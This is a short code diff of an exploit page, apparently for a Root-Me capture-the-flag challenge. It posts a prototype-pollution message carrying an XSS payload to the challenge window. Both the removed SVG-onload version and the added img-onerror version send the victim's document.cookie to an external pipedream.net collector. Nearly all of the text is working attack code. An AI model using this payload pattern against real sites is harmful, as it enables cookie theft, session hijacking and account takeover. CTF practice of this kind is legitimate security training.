@@ -10,13 +10,7 @@
             const target = window.open('http://node2.challenges.ctf20k.root-me.org:36975/');
 
            setTimeout(() => {
-                target.postMessage(`
-                    {
-                        "__proto__":{
-                            "urgentMessage":"<svg onload='var xhr=new XMLHttpRequest();xhr.open(\"POST\", \"https://eotqkw100h253ph.m.pipedream.net\", true);xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");xhr.send(\"cookies=\"+encodeURIComponent(document.cookie));' style='display:none'></svg>"
-                        }
-                    }
-                `, '*');
+                target.postMessage('{"__proto__":{"urgentMessage":"<img src=x onerror=location.href=\"https://eotqkw100h253ph.m.pipedream.net/?c=\".concat(document.cookie)"}}', '*');
             }, 1000);
         };
     </script>
